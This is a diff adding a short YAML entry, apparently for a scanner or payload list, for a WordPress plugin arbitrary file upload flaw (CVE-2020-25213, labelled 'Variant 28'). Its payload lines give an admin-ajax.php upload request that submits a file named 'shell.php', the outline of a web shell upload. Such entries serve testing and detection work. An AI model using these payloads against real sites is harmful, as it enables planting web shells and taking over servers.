@@ -1,0 +1,8 @@
+cve: CVE-2020-25213-V28
+description: Arbitrary file upload vulnerability in WordPress plugin.
+name: WordPress File Upload Bypass Variant 28
+payloads:
+- POST /wp-admin/admin-ajax.php?action=upload_file
+- 'Content-Disposition: form-data; name="file"; filename="shell.php"'
+severity: high
+type: upload
